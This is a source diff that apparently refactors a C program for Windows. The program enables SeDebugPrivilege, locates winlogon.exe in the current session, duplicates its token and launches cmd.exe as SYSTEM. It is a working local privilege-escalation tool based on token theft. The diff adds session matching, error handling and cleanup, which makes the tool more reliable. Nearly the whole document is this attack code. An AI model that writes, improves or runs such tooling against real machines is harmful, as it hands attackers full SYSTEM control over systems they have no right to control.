@@ -1,18 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <string.h>
-#include <TlHelp32.h>
-
-void print_banner() {
-    printf (
-        "  _________      ________        ___.                 "
-        " /   _____/ ____ \______ \   ____\_ |__  __ __  ____  "
-        " \_____  \_/ __ \ |    |  \_/ __ \| __ \|  |  \/ ___\ "
-        " /        \  ___/ |    `   \  ___/| \_\ \  |  / /_/  >"
-        "/_______  /\___  >_______  /\___  >___  /____/\___  / "
-        "        \/     \/        \/     \/    \/     /_____/  "
-    );
-}
+#include <tlhelp32.h>
 
 int main() {
 
@@ -32,7 +21,6 @@ int main() {
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(PROCESSENTRY32);
 
-
     // OpenProcessToken Defining Variables
     HANDLE hSystemToken;
 
@@ -47,90 +35,91 @@ int main() {
     ZeroMemory(&pi, sizeof(pi));
 
     // get LUID to SeDebugPrivilege
-
-    if (LookupPrivilegeValueA(
-        NULL, // 特権名を取得するシステムの名前
-        "SeDebugPrivilege", // privname
-        &luid
-    ) == FALSE ){
-        printf("[-]LookupPrivilegeValueA:", GetLastError());
-    } else {
-        pritnf("[+]Successfully found SeDebug LUID");
+    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid) == FALSE) {
+        printf("[-]LookupPrivilegeValueA failed: %lu\n", GetLastError());
+        return 1;
     }
-    
-    // add
+    printf("[+]Successfully found SeDebug LUID\n");
+
     tp.Privileges[0].Luid = luid;
 
-    // get curennt user token
-
-    if (OpenProcessToken (
-        GetCurrentProcess(), // 現在のプロセスのトークンを取得
-        TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // https://learn.microsoft.com/ja-jp/windows/win32/secauthz/access-rights-for-access-token-objects
+    // get current user token
+    if (OpenProcessToken(
+        GetCurrentProcess(),
+        TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
         &hToken
     ) == FALSE) {
-        printf("OpenProcessToken Failed:", GetLastError());
+        printf("[-]OpenProcessToken failed: %lu\n", GetLastError());
         return 1;
-    } else {
-        printf("Successfully OpenProcessToken");
     }
-    
-
+    printf("[+]Successfully OpenProcessToken\n");
 
     // enable SeDebugPrivilege
-
-    if (AdjustTokenPrivileges (
-        hToken,
-        FALSE,
-        &tp,
-        sizeof(tp),
-        NULL,
-        NULL
-    ) == FALSE ){
-        printf("[-]AdjustTokenPrivileges failed:", GetLastError());
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        printf("[-]AdjustTokenPrivileges failed: ERROR_NOT_ALL_ASSIGNED\n");
         return 1;
-    } else {
-        printf("[+]Successfully enabled SeDebugPrivilege");
+    }
+    printf("[+]Successfully enabled SeDebugPrivilege\n");
+
+    // get current session ID
+    DWORD currentSessionId;
+    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
+    printf("[*]Current SessionId: %lu\n", currentSessionId);
+
+    // find winlogon.exe in the same session
+    HANDLE hsprocess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hsprocess == INVALID_HANDLE_VALUE) {
+        printf("[-]CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
+        return 1;
     }
 
-    HANDLE hsprocess = CreateToolhelp32Snapshot(
-        TH32CS_SNAPPROCESS,
-        0
-    );
-    Process32First(hsprocess,&pe);
-    
-    do{
-        if (strcmp(pe.szExeFile, "winlogon.exe") == 0){
-            printf("[+]Successfully found winlogon.exe");
-            break;
-        };
-    }while(Process32Next(hsprocess, &pe));
-    // peが所持している
+    BOOL found = FALSE;
+    Process32First(hsprocess, &pe);
+    do {
+        if (strcmp(pe.szExeFile, "winlogon.exe") == 0) {
+            DWORD peSessionId;
+            ProcessIdToSessionId(pe.th32ProcessID, &peSessionId);
+            if (peSessionId == currentSessionId) {
+                printf("[+]Successfully found winlogon.exe PID=%lu Session=%lu\n",
+                    pe.th32ProcessID, peSessionId);
+                found = TRUE;
+                break;
+            }
+        }
+    } while (Process32Next(hsprocess, &pe));
+    CloseHandle(hsprocess);
 
-    HANDLE hProcess = OpenProcess(
-        PROCESS_ALL_ACCESS,
-        FALSE,
-        pe.th32ProcessID
-    );
+    if (!found) {
+        printf("[-]winlogon.exe not found in session %lu\n", currentSessionId);
+        return 1;
+    }
+
+    // open winlogon process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
     if (hProcess == NULL) {
-    printf("OpenProcess失敗: %lu\n", pe.th32ProcessID);
-    return 1;
-    }
-
-    if (OpenProcessToken (
-        hProcess,
-        TOKEN_DUPLICATE|TOKEN_ADJUST_PRIVILEGES,  // https://learn.microsoft.com/ja-jp/windows/win32/secauthz/access-rights-for-access-token-objects
-        &hSystemToken
-    ) == FALSE ){
-        printf("OpenProcessToken失敗: %lu\n", GetLastError());
+        printf("[-]Failed OpenProcess PID=%lu Error=%lu\n", pe.th32ProcessID, GetLastError());
         return 1;
-    };
-    printf("OpenProcessToken成功\n");
+    }
+    printf("[+]OpenProcess success PID=%lu\n", pe.th32ProcessID);
 
-    if (DuplicateTokenEx (
+    // get winlogon token
+    if (OpenProcessToken(
+        hProcess,
+        TOKEN_DUPLICATE,
+        &hSystemToken
+    ) == FALSE) {
+        printf("[-]Failed OpenProcessToken: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[+]Successfully OpenProcessToken\n");
+
+    // duplicate token
+    if (DuplicateTokenEx(
         hSystemToken,
-        MAXIMUM_ALLOWED, // 取得できるすべての権限を取得する
+        MAXIMUM_ALLOWED,
         NULL,
-        SecurityImpersonation, // https://learn.microsoft.com/ja-jp/windows/win32/api/winnt/ne-winnt-security_impersonation_level
+        SecurityImpersonation,
         TokenPrimary,
         &hDuplicateSystemToken
     ) == FALSE) {
@@ -139,25 +128,32 @@ int main() {
     }
     printf("[+]Successfully DuplicateTokenEx\n");
 
+    // spawn cmd.exe as SYSTEM
     BOOL result = CreateProcessWithTokenW(
-    hDuplicateSystemToken,
-    LOGON_WITH_PROFILE,
-    NULL,
-    L"cmd.exe",
-    CREATE_NEW_CONSOLE,
-    NULL,
-    NULL,
-    &si,
-    &pi
+        hDuplicateSystemToken,
+        LOGON_WITH_PROFILE,
+        NULL,
+        L"cmd.exe",
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &si,
+        &pi
     );
 
     if (result == FALSE) {
-    printf("[-]Filed: %lu\n", GetLastError());
-    return 1;
+        printf("[-]CreateProcessWithTokenW failed: %lu\n", GetLastError());
+        return 1;
     }
-    printf("[+]Successfly New cmd.exe\n");
-
+    printf("[+]Successfully started SYSTEM cmd.exe\n");
 
     // clean up
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hDuplicateSystemToken);
+    CloseHandle(hSystemToken);
+    CloseHandle(hProcess);
     CloseHandle(hToken);
+
+    return 0;
 }
